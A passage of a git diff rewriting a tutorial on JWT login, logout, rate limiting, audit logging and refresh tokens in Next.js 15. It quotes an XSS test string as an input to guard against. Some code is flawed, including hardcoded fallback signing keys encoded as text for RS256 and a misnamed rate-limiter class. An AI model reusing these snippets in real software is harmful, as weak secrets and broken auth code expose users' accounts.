+    return { code: -1, message: 'Invalid username or password' }
+  }
+
+  // 3. Sign the JWT
+  const token = await new SignJWT({
+    userId: user.id,
+    name: user.name,
+  })
+    .setProtectedHeader({ alg: 'RS256' })
+    .setExpirationTime('7d')
+    .sign(privateKey)
+
+  // 4. Set the Cookie
+  const cookieStore = await cookies()
+  cookieStore.set('auth_token', token, {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'lax',
+    maxAge: 60 * 60 * 24 * 7,
+    path: '/',
+  })
+
+  return { code: 0, message: 'Login successful' }
 }
 ```
 
-> **Tip**: Why write the error message as "Invalid username or password" instead of separately indicating which one is wrong? Because if you give separate hints, hackers can probe to find out which usernames are registered.
+Why "Invalid username or password" instead of telling them which one was wrong?
 
-### 4.3 Session Check: Get Current User
+Because if you say "user not found" vs "wrong password," an attacker can test different usernames to discover which ones are registered. This is called user enumeration. Once they have a list of valid usernames, they target those with password attempts. Always return the same error message for both cases. Give away nothing.
+
+### Check Current User
 
 ```typescript
-class AuthService {
-  /**
-   * Get current logged-in user information
-   */
-  async getCurrentUser(): Promise<JWTPayload | null> {
-    try {
-      const cookieStore = await cookies()
-      const token = cookieStore.get('auth_token')
+async function getCurrentUser() {
+  const cookieStore = await cookies()
+  const token = cookieStore.get('auth_token')?.value
 
-      if (!token) {
-        return null
-      }
+  if (!token) return null
 
-      return await this.verifyToken(token.value)
-    } catch (error) {
-      console.error('Failed to get current user:', error)
-      return null
-    }
-  }
-
-  /**
-   * Check if logged in
-   */
-  async isAuthenticated(): Promise<boolean> {
-    const user = await this.getCurrentUser()
-    return user !== null
+  try {
+    const { payload } = await jwtVerify(token, publicKey)
+    return payload // { userId, name }
+  } catch {
+    return null // Expired or tampered
   }
 }
 ```
 
-### 4.4 User Logout
+### Signout
+
+JWT's stateless nature creates a subtle awkwardness here: signing out just deletes the Cookie. The Token itself is still "alive." If someone intercepted it before you logged out, they can still use it until it expires.
 
 ```typescript
-class AuthService {
-  /**
-   * Logout
-   */
-  async logout(): Promise<IDataResult<boolean>> {
-    try {
-      const cookieStore = await cookies()
-
-      // Clear Cookie
-      cookieStore.delete('auth_token')
-
-      return {
-        code: 0,
-        message: 'Logged out',
-        data: true,
-      }
-    } catch (error) {
-      console.error('Logout failed:', error)
-      return {
-        code: -1,
-        message: 'Logout failed',
-        data: false,
-      }
-    }
-  }
+async function logout() {
+  const cookieStore = await cookies()
+  cookieStore.delete('auth_token')
+  // The Token is still technically "valid" on the server...
+  // The browser just will not send it anymore.
 }
 ```
+
+This problem — "the Token outlives the logout" — is exactly one of the reasons we need a refresh token mechanism.
 
 ---
 
-## 5. Next.js 15 Adaptation: Elegant Wrapper for Server Actions
+## Five: One Pitfall in Next.js 15 — Server Actions Cannot Export Classes
 
-### 5.1 Server Actions Limitations and Solutions
+Next.js 15 Server Actions have a restriction: `'use server'` files can only export plain functions, not classes or class instances.
 
-Next.js 15's Server Actions have a limitation: **can only export functions, not classes or instances**.
-
-This doesn't mean you have to abandon object-oriented design—we can use classes internally and expose functions externally:
+This does not mean you abandon object-oriented design. Use a class internally, expose functions externally:
 
 ```typescript
-// lib/auth-actions.ts
+// lib/auth-service.ts — internal, object-oriented
+class AuthService {
+  async register(name: string, password: string) {
+    /* ... */
+  }
+  async login(name: string, password: string) {
+    /* ... */
+  }
+  async logout() {
+    /* ... */
+  }
+  async getCurrentUser() {
+    /* ... */
+  }
+}
+
+// lib/auth-actions.ts — external, functional
 import { AuthService } from './auth-service'
 
-// Create service instance internally
 const authService = new AuthService()
 
-/**
- * Register user
- */
 export async function register(formData: FormData) {
   const name = formData.get('name') as string
   const password = formData.get('password') as string
-
   return await authService.register(name, password)
 }
 
-/**
- * Login user
- */
 export async function login(formData: FormData) {
   const name = formData.get('name') as string
   const password = formData.get('password') as string
-
   return await authService.login(name, password)
 }
 
-/**
- * Logout
- */
 export async function logout() {
   return await authService.logout()
 }
-
-/**
- * Check auth status
- */
-export async function checkAuth() {
-  return await authService.isAuthenticated()
-}
 ```
 
-The elegance of this design:
-
-- **External interface**: Simple functional API, compliant with Server Actions spec
-- **Internal implementation**: Object-oriented service class, ensuring code organization and testability
-
-### 5.2 How to Use on Frontend?
-
-**Registration Form:**
-
-```tsx
-'use server'
-
-import { register } from '@/lib/auth-actions'
-
-export default function RegisterPage() {
-  async function handleSubmit(formData: FormData) {
-    const result = await register(formData)
-
-    if (result.code === 0) {
-      // Redirect to login page
-      redirect('/login')
-    } else {
-      // Show error
-      alert(result.message)
-    }
-  }
-
-  return (
-    <form action={handleSubmit}>
-      <input name="name" placeholder="Username" />
-      <input name="password" type="password" placeholder="Password" />
-      <button type="submit">Register</button>
-    </form>
-  )
-}
-```
-
-**Login Form:**
-
-```tsx
-'use server'
-
-import { login } from '@/lib/auth-actions'
-import { redirect } from 'next/navigation'
-
-export default function LoginPage() {
-  async function handleSubmit(formData: FormData) {
-    const result = await login(formData)
-
-    if (result.code === 0) {
-      redirect('/dashboard')
-    } else {
-      alert(result.message)
-    }
-  }
-
-  return (
-    <form action={handleSubmit}>
-      <input name="name" placeholder="Username" />
-      <input name="password" type="password" placeholder="Password" />
-      <button type="submit">Login</button>
-    </form>
-  )
-}
-```
+The beauty of this pattern: internal logic stays organized and testable. External API stays clean and conformant. Best of both worlds.
 
 ---
 
-## 6. Frontend Integration: React Hook Best Practices
+## Six: Frontend — A Hook to Manage Auth State
 
-### 6.1 Custom Hook for Auth State
-
-On the client side, we can use a custom Hook to manage authentication state:
+On the client side, you need to know "is the user logged in right now?" One custom hook is all it takes:
 
 ```typescript
-import { useState, useEffect, useCallback } from 'react'
-import { checkAuth } from '@/lib/auth-actions'
-
-interface User {
-  userId: string
-  name: string
-}
-
-export function useAuth() {
+function useAuth() {
   const [user, setUser] = useState<User | null>(null)
   const [loading, setLoading] = useState(true)
 
-  // Check login status
-  const checkAuthStatus = useCallback(async () => {
+  const checkAuth = useCallback(async () => {
     setLoading(true)
     try {
-      const userData = await checkAuth()
+      const userData = await fetchCurrentUser()
       setUser(userData)
-    } catch (error) {
-      console.error('Auth check failed:', error)
+    } catch {
       setUser(null)
     } finally {
       setLoading(false)
     }
   }, [])
 
-  // Check once when component mounts
   useEffect(() => {
-    checkAuthStatus()
-  }, [checkAuthStatus])
-
-  // Refresh auth status (call after login/logout)
-  const refreshAuth = useCallback(() => {
-    checkAuthStatus()
-  }, [checkAuthStatus])
+    checkAuth()
+  }, [checkAuth])
 
   return {
     user,
     loading,
     isAuthenticated: user !== null,
-    refreshAuth,
+    refresh: checkAuth,
   }
 }
 ```
 
-### 6.2 Using in Pages
+Using it in a page:
 
 ```tsx
-'use client'
+function DashboardPage() {
+  const { user, loading, isAuthenticated, refresh } = useAuth()
 
-import { useAuth } from '@/hooks/useAuth'
-import { logout } from '@/lib/auth-actions'
-import { useRouter } from 'next/navigation'
-
-export default function DashboardPage() {
-  const { user, loading, isAuthenticated, refreshAuth } = useAuth()
-  const router = useRouter()
-
-  async function handleLogout() {
-    await logout()
-    refreshAuth()
-    router.push('/login')
-  }
-
-  if (loading) {
-    return <div className="loading">Loading...</div>
-  }
-
-  if (!isAuthenticated) {
-    return <div className="not-logged-in">Please log in first</div>
-  }
+  if (loading) return <div>Loading...</div>
+  if (!isAuthenticated) return <div>Please log in first</div>
 
   return (
-    <div className="dashboard">
-      <h1>Welcome back, {user?.name}!</h1>
-      <p>This is your personal dashboard</p>
-      <button onClick={handleLogout}>Logout</button>
+    <div>
+      <h1>Welcome back, {user.name}</h1>
+      <button
+        onClick={async () => {
+          await logout()
+          refresh()
+        }}
+      >
+        Sign out
+      </button>
     </div>
   )
 }
@@ -791,828 +604,398 @@ export default function DashboardPage() {
 
 ---
 
-## 7. Security Hardening: Essential for Production
+## Seven: Three Patches You Must Apply
 
-### 7.1 Input Validation: Runtime Protection with Zod
+### Rate Limiting: The Bouncer
 
-Server-side validation can never be skipped. Zod can check data types at runtime:
+You walk up to a club. The bouncer stops you: "Three ID checks. Three fails, you are outside for an hour."
 
-```typescript
-import { z } from 'zod'
-
-// Define validation rules
-const loginSchema = z.object({
-  name: z.string().min(1, 'Username cannot be empty').max(50, 'Username too long'),
-  password: z.string().min(6, 'Password must be at least 6 characters').max(100, 'Password too long'),
-})
-
-// Use in login function
-async function login(formData: FormData) {
-  const name = formData.get('name') as string
-  const password = formData.get('password') as string
-
-  // Validate input
-  const result = loginSchema.safeParse({ name, password })
-
-  if (!result.success) {
-    return {
-      code: -1,
-      message: result.error.errors[0].message,
-      data: { user: null },
-    }
-  }
-
-  // Validation passed, continue with business logic
-}
-```
-
-### 7.2 Rate Limiting: Prevent Brute Force Attacks
-
-Hackers can use programs to frantically try various password combinations—this is "brute force attack." Rate limiting blocks this path:
+Rate limiting is that bouncer. It stops scripts from brute-forcing passwords.
 
 ```typescript
 import { RateLimiter } from 'rate-limiter-flexible'
 
-// IP-based rate limiter
-const ipRateLimiter = new RateLimiter({
+// Per IP
+const ipLimiter = new RateLimiter({
   points: 10, // 10 attempts
-  duration: 60, // within 60 seconds
+  duration: 60, // per 60 seconds
   blockDuration: 300, // blocked for 5 minutes
 })
 
-// Username-based rate limiter (prevents one person from locking others' accounts)
-const usernameRateLimiter = new RateLimiter({
+// Per username — prevents locking someone else's account
+const usernameLimiter = new RateLimiter({
   points: 5, // 5 attempts
-  duration: 900, // within 15 minutes
-  blockDuration: 900, // blocked for 15 minutes
+  duration: 900, // per 15 minutes
+  blockDuration: 900,
 })
 
-async function login(name: string, password: string) {
-  // Check if IP is rate limited
-  const ipKey = 'login:' + getClientIP()
+async function login(ip: string, name: string, password: string) {
   try {
-    await ipRateLimiter.consume(ipKey)
-  } catch (error) {
-    return {
-      code: -1,
-      message: 'Too many attempts, please try again later',
-      data: { user: null },
-    }
+    await ipLimiter.consume(ip)
+  } catch {
+    return { code: -1, message: 'Too many attempts. Try again later.' }
   }
-
-  // Check if username is rate limited
   try {
-    await usernameRateLimiter.consume(name)
-  } catch (error) {
-    return {
-      code: -1,
-      message: 'Too many login attempts for this account, please try again in 15 minutes',
-      data: { user: null },
-    }
+    await usernameLimiter.consume(name)
+  } catch {
+    return { code: -1, message: 'Too many attempts on this account. Try in 15 minutes.' }
   }
-
-  // Original login logic...
+  // ... normal login logic
 }
 ```
 
-### 7.3 Audit Logs: Recording Every Authentication Event
+### Audit Logging: The Security Camera
 
-Audit logs are the last line of defense for security. When something goes wrong, there's evidence to trace:
+You are in a shopping mall. Cameras everywhere. When nothing happens, they silently record. When something happens, you pull the footage and see exactly what went down.
+
+Audit logs are those cameras.
 
 ```typescript
-class AuthService {
-  /**
-   * Record audit log
-   */
-  private async createAuditLog(action: string, metadata: Record<string, any>, userId?: string) {
-    try {
-      await this.prisma.auditLog.create({
-        data: {
-          action,
-          userId,
-          metadata,
-          ipAddress: getClientIP(),
-          userAgent: getUserAgent(),
-          createdAt: new Date(),
-        },
-      })
-    } catch (error) {
-      // Audit log failure shouldn't affect business flow
-      console.error('Failed to write audit log:', error)
-    }
+async function createAuditLog(action: string, metadata: Record<string, any>, userId?: string) {
+  await prisma.auditLog.create({
+    data: {
+      action, // 'LOGIN_SUCCESS' / 'LOGIN_FAILED' / 'REGISTER'
+      userId,
+      metadata, // { reason: 'wrong_password', ip: '...' }
+      ipAddress: getClientIP(),
+      userAgent: getUserAgent(),
+    },
+  })
+}
+
+// During login
+async function login(name: string, password: string) {
+  // ... verification logic ...
+  if (!user) {
+    await createAuditLog('LOGIN_FAILED', { reason: 'user_not_found' })
+    return { code: -1, message: 'Invalid username or password' }
   }
-
-  /**
-   * Login (with audit)
-   */
-  async login(name: string, password: string) {
-    try {
-      const user = await this.prisma.user.findFirst({ where: { name } })
-
-      if (!user) {
-        // Record failed attempt (without revealing "user doesn't exist")
-        await this.createAuditLog('LOGIN_FAILED', { reason: 'user_not_found' })
-        return { code: -1, message: 'Invalid username or password' }
-      }
-
-      const isValid = await verify(user.password, password)
-
-      if (!isValid) {
-        await this.createAuditLog('LOGIN_FAILED', {
-          reason: 'wrong_password',
-          userId: user.id,
-        })
-        return { code: -1, message: 'Invalid username or password' }
-      }
-
-      // Login successful
-      await this.createAuditLog('LOGIN_SUCCESS', {
-        userId: user.id,
-      })
-
-      // Generate Token, set Cookie...
-      return { code: 0, message: 'Login successful' }
-    } catch (error) {
-      await this.createAuditLog('LOGIN_ERROR', {
-        error: (error as Error).message,
-      })
-      throw error
-    }
+  if (!isValid) {
+    await createAuditLog('LOGIN_FAILED', { reason: 'wrong_password', userId: user.id })
+    return { code: -1, message: 'Invalid username or password' }
   }
+  await createAuditLog('LOGIN_SUCCESS', { userId: user.id })
+  // ...
 }
 ```
+
+Two principles for audit logs:
+
+1. Record failures in detail — IP, reason, timestamp. You need the forensic trail.
+2. If audit logging itself fails, do not block the business flow. Logging is a sidecar, not a gate.
+
+### Input Validation: The Security Checkpoint
+
+What if someone types SQL into your signup form? What if they inject `<script>alert(1)</script>`? What if the username field arrives with 2MB of data?
+
+Zod on the server side is your security checkpoint. Frontend validation does not count — it is a UX convenience, not a security measure. Anyone can `curl` a POST request and bypass your form entirely.
+
+```typescript
+const loginSchema = z.object({
+  name: z.string().min(1).max(50),
+  password: z.string().min(6).max(100),
+})
+
+// First thing in every login function:
+const result = loginSchema.safeParse({ name, password })
+if (!result.success) {
+  return { code: -1, message: result.error.errors[0].message }
+}
+```
+
+Server-side validation. Always. No exceptions.
 
 ---
 
-## 8. Refresh Tokens: Essential for Production
+## Eight: Refresh Tokens — Solving JWT's Core Contradiction
 
-### 8.1 Problems with Plain JWT
+### The Contradiction That Keeps You Awake
 
-Currently, our JWT has a 7-day validity period. But there's a contradiction:
+Back to JWT's biggest pain point.
 
-- **Token too short**: Users have to log in every 15 minutes, poor experience
-- **Token too long**: If the Token is leaked, hackers have plenty of time to cause damage
+Long-lived Token → if stolen, the attacker has a long window to do damage. You have basically handed them a vacation.
 
-Refresh token mechanism perfectly solves this contradiction:
+Short-lived Token → the user has to re-enter their password every 15 minutes. The experience is garbage.
+
+How do you break this?
+
+### The Answer: Two Tokens, Two Jobs
+
+You join a gym. You get a membership card that has two parts:
+
+1. **Entry wristband** (short-lived, 15 minutes): Gets you through the turnstile. Lose it? No big deal — it expires in 15 minutes.
+2. **Membership card** (long-lived, 7 days): When your wristband is about to expire, you swipe this at the front desk and get a new wristband. Silent. Seamless.
+
+In an auth system:
+
+- **Access Token** = the wristband. 15 minutes. Used for every API request. If it leaks, the attack window is 15 minutes.
+- **Refresh Token** = the membership card. 7 days. Used **only** when refreshing the Access Token. Rarely transmitted, rarely exposed. Leaked? You can revoke it.
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                     Refresh Token Flow                          │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  Access Token (Short-lived)       Refresh Token (Long-lived)    │
-│  ├─ Valid: 15 minutes            ├─ Valid: 7 days               │
-│  ├─ Used for API access          ├─ Used to get new Access Token │
-│  ├─ Small attack window if leak  ├─ Can be revoked if leaked    │
-│  └─ Can rotate frequently        └─ Not used frequently, less exposure  │
-│                                                                  │
-│  User flow:                                                      │
-│  1. Login → Return Access Token + Refresh Token                    │
-│  2. Use Access Token to access API                               │
-│  3. Access Token expiring soon → Use Refresh Token for new one   │
-│  4. Refresh Token expiring soon → Get another new one           │
-│  5. User inactive for long time → Refresh Token expires, re-login │
-│                                                                  │
-└─────────────────────────────────────────────────────────────────┘
+User flow:
+1. Login         → Server returns Access Token + Refresh Token
+2. Normal use    → Carry the Access Token everywhere
+3. Access expires → Silently use Refresh Token to get a new Access Token
+4. Refresh expires → Too long since last visit. Log in again.
+5. Sign out      → Server marks Refresh Token as revoked
 ```
 
-### 8.2 Three Design Approaches: Trade-offs
+### Three Approaches, One Winner
 
-#### Approach 1: Stateful Refresh Tokens
+**Approach One: Stateful (Store in Database)**
 
-Store Refresh Tokens in the database:
+Store the full Refresh Token in the database. Maximum control — revoke anytime, list user's devices, full audit trail. Downside: database dependency, query on every refresh.
+
+**Approach Two: Stateless (Pure JWT)**
+
+Refresh Token itself is a JWT. Zero database dependency. Fully stateless. Downside: cannot revoke. Once issued, it lives until expiry. User changes their password? Old Refresh Token is still valid. Think about that for a second.
+
+**Approach Three: Hybrid (Metadata Only)** — **This is the right answer.**
+
+The Refresh Token is still a JWT, but you store only its unique identifier (jti) and revocation status in the database. Not the full Token. You keep most of the stateless benefits while gaining revocation capability.
 
 ```prisma
-model RefreshToken {
+model RefreshTokenMetadata {
   id        String   @id @default(cuid())
-  token     String   @unique
+  jti       String   @unique    // Unique ID from the JWT
   userId    String
-  user      User     @relation(...)
   expiresAt DateTime
-  createdAt DateTime @default(now())
-  revoked   Boolean  @default(false)
+  revoked   Boolean  @default(false)  // Set to true to revoke
+  @@index([userId])
 }
 ```
 
-**Pros:**
+### Full Implementation
 
-- Can revoke individual Tokens at any time
-- Supports multi-device management
-- Can record usage logs
-
-**Cons:**
-
-- Requires database storage
-- Goes against JWT's stateless philosophy
-
-#### Approach 2: Stateless Refresh Tokens
-
-Also make Refresh Token a JWT:
+#### Issuing Access Token + Refresh Token
 
 ```typescript
-async function generateRefreshToken(userId: string): Promise<string> {
-  return await new SignJWT({ userId, type: 'refresh' })
+// Access Token: 15-minute lifetime
+async function generateAccessToken(userId: string, name: string) {
+  return await new SignJWT({ userId, name, type: 'access' })
     .setProtectedHeader({ alg: 'RS256' })
-    .setExpirationTime('7d')
-    .sign(refreshTokenPrivateKey) // Use different key
-}
-```
-
-**Pros:**
-
-- Completely stateless
-- No database storage needed
-- Simple to implement
-
-**Cons:**
-
-- Cannot revoke actively
-- If leaked, cannot invalidate immediately
-- Doesn't support fine-grained device management
-
-#### Approach 3: Hybrid Approach (Best Choice)
-
-Only store Token metadata (jti), not the complete Token:
-
-```prisma
-model RefreshTokenMetadata {
-  id        String   @id @default(cuid())
-  jti       String   @unique  // JWT ID, used for revocation
-  userId    String
-  expiresAt DateTime
-  revoked   Boolean  @default(false)
-}
-```
-
-**Pros:**
-
-- Can revoke Token through jti
-- Very small storage footprint (metadata only)
-- Maintains most stateless characteristics
-
-**Cons:**
-
-- Slightly more complex
-
-**Practical recommendation**: Approach 3 is the best balance. New projects should use this directly.
-
-### 8.3 Complete Hybrid Implementation
-
-#### 8.3.1 Define Database Models
-
-```prisma
-// prisma/schema.prisma
-
-model User {
-  id           String   @id @default(cuid())
-  name         String   @unique
-  password     String   // Argon2 hash
-  createdAt    DateTime @default(now())
-  updatedAt    DateTime @updatedAt
-
-  refreshTokens RefreshTokenMetadata[]
-  auditLogs     AuditLog[]
+    .setIssuedAt()
+    .setExpirationTime('15m')
+    .sign(accessTokenPrivateKey)
 }
 
-model RefreshTokenMetadata {
-  id        String   @id @default(cuid())
-  jti       String   @unique  // JWT ID, for revocation
-  userId    String
-  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)
-  expiresAt DateTime
-  revoked   Boolean  @default(false)
-  createdAt DateTime @default(now())
+// Refresh Token: 7-day lifetime, with jti
+async function generateRefreshToken(userId: string) {
+  const jti = crypto.randomUUID()
+  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
 
-  @@index([userId])
-  @@index([jti])
-}
-
-model AuditLog {
-  id        String   @id @default(cuid())
-  action    String
-  userId    String?
-  user      User?    @relation(fields: [userId], references: [id])
-  metadata  Json?
-  ipAddress String?
-  userAgent String?
-  createdAt DateTime @default(now())
-
-  @@index([userId])
-  @@index([action])
-  @@index([createdAt])
-}
-```
-
-#### 8.3.2 Complete AuthService Implementation
-
-```typescript
-import { SignJWT, jwtVerify, JWTPayload } from 'jose'
-import { cookies } from 'next/headers'
-import { PrismaClient } from '@prisma/client'
-
-const prisma = new PrismaClient()
-
-// Algorithm configuration
-const ACCESS_TOKEN_ALGORITHM = 'RS256'
-const REFRESH_TOKEN_ALGORITHM = 'RS256'
-
-// Configuration constants
-const ACCESS_TOKEN_EXPIRY = '15m' // 15 minutes
-const REFRESH_TOKEN_EXPIRY = '7d' // 7 days
-
-class AuthService {
-  private readonly prisma: PrismaClient
-
-  // Keys (should be loaded from environment variables in production)
-  private readonly accessTokenPrivateKey: Uint8Array
-  private readonly accessTokenPublicKey: Uint8Array
-  private readonly refreshTokenPrivateKey: Uint8Array
-  private readonly refreshTokenPublicKey: Uint8Array
-
-  constructor() {
-    this.prisma = prisma
-
-    // Initialize keys (simplified example of string to Uint8Array)
-    // In production, load from secure key management system
-    this.accessTokenPrivateKey = new TextEncoder().encode(process.env.JWT_PRIVATE_KEY || 'access-private-key')
-    this.accessTokenPublicKey = new TextEncoder().encode(process.env.JWT_PUBLIC_KEY || 'access-public-key')
-    this.refreshTokenPrivateKey = new TextEncoder().encode(process.env.REFRESH_PRIVATE_KEY || 'refresh-private-key')
-    this.refreshTokenPublicKey = new TextEncoder().encode(process.env.REFRESH_PUBLIC_KEY || 'refresh-public-key')
-  }
-
-  /**
-   * Generate Access Token (short-lived)
-   */
-  async generateAccessToken(payload: { userId: string; name: string }): Promise<string> {
-    return await new SignJWT(payload)
-      .setProtectedHeader({ alg: ACCESS_TOKEN_ALGORITHM })
-      .setIssuedAt()
-      .setExpirationTime(ACCESS_TOKEN_EXPIRY)
-      .sign(this.accessTokenPrivateKey)
-  }
-
-  /**
-   * Generate Refresh Token (JWT format + metadata storage)
-   */
-  async generateRefreshToken(userId: string): Promise<string> {
-    // Generate unique JWT ID
-    const jti = crypto.randomUUID()
-
-    // Calculate expiration time
-    const expiresAt = new Date()
-    expiresAt.setDate(expiresAt.getDate() + 7)
-
-    // Store metadata (only store jti, not the complete token)
-    await this.prisma.refreshTokenMetadata.create({
-      data: {
-        jti,
-        userId,
-        expiresAt,
-      },
-    })
-
-    // Generate Refresh Token in JWT format
-    return await new SignJWT({
-      userId,
-      jti,
-      type: 'refresh',
-    })
-      .setProtectedHeader({ alg: REFRESH_TOKEN_ALGORITHM })
-      .setIssuedAt()
-      .setExpirationTime(REFRESH_TOKEN_EXPIRY)
-      .setJti(jti)
-      .sign(this.refreshTokenPrivateKey)
-  }
-
-  /**
-   * Verify Refresh Token
-   */
-  async verifyRefreshToken(token: string): Promise<{
-    isValid: boolean
-    userId?: string
-    jti?: string
-  }> {
-    try {
-      // 1. Verify JWT signature and expiration
-      const { payload } = await jwtVerify(token, this.refreshTokenPublicKey, {
-        algorithms: [REFRESH_TOKEN_ALGORITHM],
-      })
-
-      const { userId, jti, type } = payload as any
-
-      if (type !== 'refresh' || !userId || !jti) {
-        return { isValid: false }
-      }
-
-      // 2. Check if metadata is revoked
-      const metadata = await this.prisma.refreshTokenMetadata.findUnique({
-        where: { jti },
-      })
-
-      if (!metadata) {
-        return { isValid: false }
-      }
-
-      if (metadata.revoked) {
-        return { isValid: false }
-      }
-
-      // 3. Check if expired (double check)
-      if (metadata.expiresAt < new Date()) {
-        return { isValid: false }
-      }
-
-      return { isValid: true, userId, jti }
-    } catch (error) {
-      console.error('Refresh Token verification failed:', error)
-      return { isValid: false }
-    }
-  }
-
-  /**
-   * Revoke single Refresh Token
-   */
-  async revokeRefreshToken(jti: string): Promise<void> {
-    await this.prisma.refreshTokenMetadata.update({
-      where: { jti },
-      data: { revoked: true },
-    })
-  }
-
-  /**
-   * Revoke all user's Refresh Tokens (for "logout all devices")
-   */
-  async revokeAllUserRefreshTokens(userId: string): Promise<void> {
-    await this.prisma.refreshTokenMetadata.updateMany({
-      where: {
-        userId,
-        revoked: false,
-      },
-      data: { revoked: true },
-    })
-  }
-
-  /**
-   * Clean up expired Refresh Token metadata
-   */
-  async cleanupExpiredRefreshTokens(): Promise<number> {
-    const result = await this.prisma.refreshTokenMetadata.deleteMany({
-      where: {
-        expiresAt: {
-          lt: new Date(),
-        },
-      },
-    })
-    return result.count
-  }
-
-  /**
-   * Login (new version, with refresh tokens)
-   */
-  async login(name: string, password: string) {
-    try {
-      // 1. Find user
-      const user = await this.prisma.user.findUnique({ where: { name } })
-
-      if (!user) {
-        return { code: -1, message: 'Invalid username or password' }
-      }
-
-      // 2. Verify password
-      const isValid = await verify(user.password, password)
-      if (!isValid) {
-        return { code: -1, message: 'Invalid username or password' }
-      }
-
-      // 3. Generate Access Token and Refresh Token
-      const accessToken = await this.generateAccessToken({
-        userId: user.id,
-        name: user.name,
-      })
-      const refreshToken = await this.generateRefreshToken(user.id)
-
-      // 4. Set Cookie
-      const cookieStore = await cookies()
-
-      // Access Token: short-lived, path=/ works site-wide
-      cookieStore.set('access_token', accessToken, {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: 'lax',
-        maxAge: 15 * 60, // 15 minutes
-        path: '/',
-      })
-
-      // Refresh Token: long-lived, path=/api/auth/refresh only used for refresh
-      cookieStore.set('refresh_token', refreshToken, {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: 'lax',
-        maxAge: 7 * 24 * 60 * 60, // 7 days
-        path: '/api/auth/refresh', // Key: only sent to refresh endpoint
-      })
-
-      return {
-        code: 0,
-        message: 'Login successful',
-        data: {
-          user: { id: user.id, name: user.name },
-        },
-      }
-    } catch (error) {
-      console.error('Login failed:', error)
-      return { code: -1, message: 'Login failed' }
-    }
-  }
-
-  /**
-   * Refresh Access Token
-   */
-  async refreshAccessToken(): Promise<{
-    success: boolean
-    accessToken?: string
-    error?: string
-  }> {
-    try {
-      const cookieStore = await cookies()
-      const refreshToken = cookieStore.get('refresh_token')?.value
-
-      if (!refreshToken) {
-        return { success: false, error: 'No refresh token provided' }
-      }
-
-      // Verify Refresh Token
-      const verification = await this.verifyRefreshToken(refreshToken)
-
-      if (!verification.isValid || !verification.userId) {
-        return { success: false, error: 'Refresh token invalid or expired' }
-      }
-
-      // Get user info
-      const user = await this.prisma.user.findUnique({
-        where: { id: verification.userId },
-      })
-
-      if (!user) {
-        return { success: false, error: 'User not found' }
-      }
-
-      // Generate new Access Token
-      const newAccessToken = await this.generateAccessToken({
-        userId: user.id,
-        name: user.name,
-      })
-
-      // Set new Access Token Cookie
-      cookieStore.set('access_token', newAccessToken, {
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: 'lax',
-        maxAge: 15 * 60,
-        path: '/',
-      })
-
-      return { success: true, accessToken: newAccessToken }
-    } catch (error) {
-      console.error('Refresh token failed:', error)
-      return { success: false, error: 'Refresh failed' }
-    }
-  }
-
-  /**
-   * Logout
-   */
-  async logout(): Promise<void> {
-    try {
-      const cookieStore = await cookies()
-      const refreshToken = cookieStore.get('refresh_token')?.value
-
-      // If there's a Refresh Token, revoke it
-      if (refreshToken) {
-        try {
-          const verification = await this.verifyRefreshToken(refreshToken)
-          if (verification.jti) {
-            await this.revokeRefreshToken(verification.jti)
-          }
-        } catch {
-          // Ignore error, token might be expired
-        }
-      }
-
-      // Clear Cookies
-      cookieStore.delete('access_token')
-      cookieStore.delete('refresh_token')
-    } catch (error) {
-      console.error('Logout failed:', error)
-    }
-  }
-
-  /**
-   * Get current user
-   */
-  async getCurrentUser(): Promise<JWTPayload | null> {
-    try {
-      const cookieStore = await cookies()
-      const accessToken = cookieStore.get('access_token')?.value
-
-      if (!accessToken) {
-        return null
-      }
-
-      const { payload } = await jwtVerify(accessToken, this.accessTokenPublicKey)
-      return payload
-    } catch {
-      return null
-    }
-  }
-}
-
-export const authService = new AuthService()
-```
-
-#### 8.3.3 Refresh Endpoint
-
-```typescript
-// app/api/auth/refresh/route.ts
-import { NextResponse } from 'next/server'
-import { authService } from '@/lib/auth-service'
-
-export async function POST() {
-  const result = await authService.refreshAccessToken()
-
-  if (!result.success) {
-    return NextResponse.json({ code: -1, message: result.error }, { status: 401 })
-  }
-
-  return NextResponse.json({
-    code: 0,
-    message: 'Token refreshed successfully',
+  // Store only metadata
+  await prisma.refreshTokenMetadata.create({
+    data: { jti, userId, expiresAt },
   })
+
+  return await new SignJWT({ userId, jti, type: 'refresh' })
+    .setProtectedHeader({ alg: 'RS256' })
+    .setIssuedAt()
+    .setExpirationTime('7d')
+    .setJti(jti)
+    .sign(refreshTokenPrivateKey)
 }
 ```
 
-#### 8.3.4 Frontend Auto-Refresh Logic
+#### Verifying a Refresh Token
 
 ```typescript
-// lib/api-client.ts
+async function verifyRefreshToken(token: string) {
+  try {
+    // 1. Verify JWT signature and expiry
+    const { payload } = await jwtVerify(token, refreshTokenPublicKey)
 
+    // 2. Check the database — has this jti been revoked?
+    const metadata = await prisma.refreshTokenMetadata.findUnique({
+      where: { jti: payload.jti as string },
+    })
+
+    if (!metadata || metadata.revoked) return { valid: false }
+    if (metadata.expiresAt < new Date()) return { valid: false }
+
+    return { valid: true, userId: payload.userId as string }
+  } catch {
+    return { valid: false }
+  }
+}
+```
+
+#### Refreshing the Access Token
+
+```typescript
+async function refreshAccessToken() {
+  const cookieStore = await cookies()
+  const refreshToken = cookieStore.get('refresh_token')?.value
+
+  if (!refreshToken) return { success: false }
+
+  const { valid, userId } = await verifyRefreshToken(refreshToken)
+  if (!valid || !userId) return { success: false }
+
+  const user = await prisma.user.findUnique({ where: { id: userId } })
+  if (!user) return { success: false }
+
+  const newAccessToken = await generateAccessToken(user.id, user.name)
+
+  cookieStore.set('access_token', newAccessToken, {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'lax',
+    maxAge: 15 * 60,
+    path: '/',
+  })
+
+  return { success: true }
+}
+```
+
+#### Frontend Silent Refresh
+
+The user should never know the Access Token expired. You do a silent refresh in the API client:
+
+```typescript
 class ApiClient {
   private isRefreshing = false
-  private refreshSubscribers: Array<(token: string) => void> = []
 
-  /**
-   * Subscribe to refresh success callback
-   */
-  subscribeTokenRefresh(callback: (token: string) => void) {
-    this.refreshSubscribers.push(callback)
-  }
